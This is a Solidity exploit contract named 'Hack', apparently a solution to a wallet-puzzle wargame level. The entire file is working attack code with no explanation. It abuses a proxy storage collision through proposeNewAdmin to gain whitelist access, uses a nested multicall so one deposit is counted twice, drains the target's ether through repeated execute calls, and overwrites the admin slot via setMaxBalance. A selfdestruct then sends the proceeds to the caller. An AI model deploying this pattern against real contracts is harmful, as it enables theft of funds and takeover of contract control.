// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

contract Hack{
    address public target;
    constructor(address add) public payable  {
        target=add;
    }

    function attack(uint v) public {
        bytes memory data = abi.encodeWithSignature("proposeNewAdmin(address)", address(this));
        target.call(data);


        data = abi.encodeWithSignature("addToWhitelist(address)", address(this));
        target.call(data);


        bytes[] memory payload = new bytes[](2) ;
        payload[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory tmp = new bytes[](1) ;
        tmp[0] = abi.encodeWithSignature("deposit()");
        payload[1] = abi.encodeWithSignature("multicall(bytes[])", tmp);
        data = abi.encodeWithSignature("multicall(bytes[])", payload);
        target.call{value:v}(data);

        data = abi.encodeWithSignature("execute(address,uint256,bytes)", address(this), v, "");
        target.call(data);
        data = abi.encodeWithSignature("execute(address,uint256,bytes)", address(this), v, "");
        target.call(data);

        data = abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(address(msg.sender))));
        target.call(data);

    }
    function sendTo() public{
        selfdestruct(payable(msg.sender));
    }
    
    receive() external payable { 
        
    }
}